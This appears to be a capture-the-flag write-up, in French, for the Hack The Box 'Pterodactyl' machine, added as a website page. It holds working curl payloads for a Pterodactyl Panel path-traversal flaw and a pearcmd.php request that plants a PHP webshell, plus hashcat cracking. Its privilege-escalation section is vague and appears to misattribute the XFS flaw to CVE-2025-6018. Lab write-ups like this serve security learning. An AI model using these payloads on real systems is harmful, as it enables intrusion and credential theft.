@@ -1,0 +1,131 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - Pterodactyl">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - Pterodactyl</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-medium">Medium</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Linux (OpenSUSE)</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">07 Feb 2026</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-49132</span>
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-6018</span>
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-6019</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #e67e22; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Medium Linux OpenSUSE — LFI non authentifiée dans Pterodactyl Panel v1.11.10, RCE via pearcmd.php avec écriture dans le webroot public (contournant plusieurs pièges), crack bcrypt pour SSH, puis escalade via udisks2 avec une image XFS malveillante.</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'CVE-2025-49132 — LFI /locales/locale.json', r:'Credentials MySQL + APP_KEY Laravel' },
+        { n:'2', v:'RCE via pearcmd.php (PHP-PEAR activé)', r:'Webshell dans /var/www/pterodactyl/public/' },
+        { n:'3', v:'Dump DB MySQL + crack hash bcrypt', r:'SSH phileasfogg3 + user flag' },
+        { n:'4', v:'CVE-2025-6018 + CVE-2025-6019 — udisks2 XFS', r:'Root flag' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#e67e2222; color:#e67e22; border:1px solid #e67e2244;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — CVE-2025-49132 : LFI Path Traversal</h2>
+    <pre is:raw>nmap -sC -sV -Pn 10.129.21.226
+# 22/tcp SSH, 80/tcp nginx → pterodactyl.htb
+
+ffuf -u http://pterodactyl.htb -H 'Host: FUZZ.pterodactyl.htb' -fc 302
+# panel → panel.pterodactyl.htb</pre>
+    <p>Le changelog du site révèle deux informations critiques : <strong>Pterodactyl Panel v1.11.10</strong> (vulnérable) et <strong>PHP-PEAR activé</strong> (vecteur pour pearcmd.php).</p>
+    <pre is:raw># LFI via paramètre locale — json_decode sans sanitisation du chemin
+curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database' | jq .
+
+# Résultat :
+# username: pterodactyl
+# password: [REDACTED]
+# host: 127.0.0.1:3306
+# database: panel
+
+curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app' | jq .key
+# APP_KEY: base64:{REDACTED}</pre>
+
+    <h2>2 — RCE via pearcmd.php</h2>
+    <p>PHP-PEAR est installé. pearcmd.php, inclus via LFI, accepte des arguments depuis la query string. La commande config-create écrit un fichier arbitraire sur le disque.</p>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ PIÈGE 1 : locale.json fait un json_decode, PAS un include PHP. Le PHP écrit n'est pas exécuté via ce chemin — il faut écrire dans le webroot public.</div>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ PIÈGE 2 : Les caractères spéciaux (quotes, espaces) dans le payload corrompent le fichier écrit par pearcmd.</div>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ PIÈGE 3 : fsockopen() est désactivé → les reverse shells directs échouent avec HTTP 500.</div>
+    <pre is:raw># Solution : écrire le webshell dans /var/www/pterodactyl/public/
+# (servi directement par nginx, exécuté par PHP sans besoin de LFI)
+curl -g 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&+config-create+/<?=system($_GET[0]);?>+/var/www/pterodactyl/public/cmd.php'
+
+# Réponse pearcmd :
+# Successfully created default configuration file
+# "/var/www/pterodactyl/public/cmd.php"
+
+# Exécution directe — plus besoin de LFI !
+curl -s 'http://panel.pterodactyl.htb/cmd.php?0=id'
+# uid=474(wwwrun) gid=477(www) groups=477(www)</pre>
+    <pre is:raw># Dump de la DB MySQL via le webshell et crack bcrypt
+hashcat -m 3200 bcrypt_hash.txt /usr/share/wordlists/rockyou.txt --force
+# Status: Cracked → [REDACTED]
+
+ssh phileasfogg3@10.129.21.226
+cat ~/user.txt</pre>
+
+    <h2>3 — CVE-2025-6018/6019 : udisks2 + Image XFS</h2>
+    <pre is:raw>sudo -l
+# Un binaire autorisé → CVE-2025-6018 + CVE-2025-6019</pre>
+    <p>udisks2 traite les images disque montées par les utilisateurs standard. CVE-2025-6018 exploite le parsing d'une image XFS malformée lors du montage pour exécuter du code en tant que root.</p>
+    <pre is:raw># Créer une image XFS malformée qui exploite le parsing udisks2
+# PoC disponible sur GitHub pour CVE-2025-6018
+
+cat /root/root.txt</pre>
+    <div style="border-left:3px solid #facc15; background:rgba(250,204,21,0.05); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fde68a;">💡 udisks2 est souvent oublié lors des audits — les utilisateurs standard peuvent monter des images disque, vecteur d'escalade sous-estimé.</div>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'Pterodactyl Panel < v1.11.11 : LFI non authentifiée via locale.json',
+        'pearcmd.php : vérifier si PHP-PEAR est installé lors de toute LFI',
+        'Écrire dans le webroot public plutôt que /tmp pour contourner les restrictions PHP',
+        'Le changelog du site peut révéler la version exacte et les composants activés',
+        'udisks2 : vecteur d\'escalade sous-estimé quand les utilisateurs peuvent monter des images',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','ffuf','curl','pearcmd.php','mysql','hashcat','ssh','udisks2 PoC'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
